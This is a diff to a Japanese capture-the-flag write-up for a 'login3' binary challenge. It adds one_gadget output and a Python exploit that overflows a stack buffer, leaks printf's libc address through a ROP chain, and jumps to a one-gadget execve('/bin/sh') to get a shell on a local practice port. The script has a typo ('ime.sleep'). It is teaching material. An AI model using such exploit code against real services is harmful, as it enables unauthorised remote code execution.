@@ -1,4 +1,4 @@
-# login2
+# login3
 ## ソースコード
 ```c
 //  gcc login3.c -o login3 -fno-stack-protector -no-pie -fcf-protection=none
@@ -36,13 +36,13 @@ int main()
 そもそもフラグを読み込んでいないので、どこに処理を飛ばしてもフラグを得ることはできない。  
 そこで、/bin/shを実行して、コマンドを実行できるようにしてflagを探す。  
 
-## ASLRとその回避
-
-## Return-oriented programming
 
 ## One-gadget RCE
 One-gadget RCE(Remote Code Execution)とは、libcに存在するガジェットで、そこに実行を移すだけで/bin/shが起動するアドレス。  
 ここでガジェットとは、後述の、ROP(Return-oriented programming)で使用できる一塊の処理のことを指す。
+
+
+## ASLRとその回避
 
 
 ## Return-oriented programming
@@ -75,4 +75,50 @@ objdump -T libc-2.31.so | grep ' printf'
 bundle exec one_gadget /path/to/libc-2.31.so
 ```
 
+```
+:
+0xe6af1 execve("/bin/sh", r15, rdx)
+constraints:
+[r15] == NULL || r15 == NULL
+[rdx] == NULL || rdx == NULL
+:
+```
+上記ガジェットを使用する。
 ## 攻略
+ROPによる攻撃をPython3で実装する。
+```python
+import socket, time, struct, telnetlib
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('localhost', 10003))
+
+ime.sleep(1)
+print(s.recv(1000))
+s.sendall(
+    b'a'*0x28 +
+    struct.pack('<Q', 0x4012d3) + # pop rdi
+    struct.pack('<Q', 0x404020) + # printf
+    struct.pack('<Q', 0x401030) + # puts
+    struct.pack('<Q', 0x4011e1) + # main
+    b'\n')
+
+time.sleep(1)
+d = s.recv(1000)
+print(d)
+printf = struct.unpack('<Q', d.split(b'\n')[1].ljust(8, b'\0'))[0]
+print('printf: %x'%printf)
+
+rce = (printf
+    - 0x64e10 # printf
+    + 0xe6af1) # One-gadget RCE
+
+s.sendall(
+    b'a'*0x28 +
+    struct.pack('<Q', rce) +
+    b'\n')
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+
+```
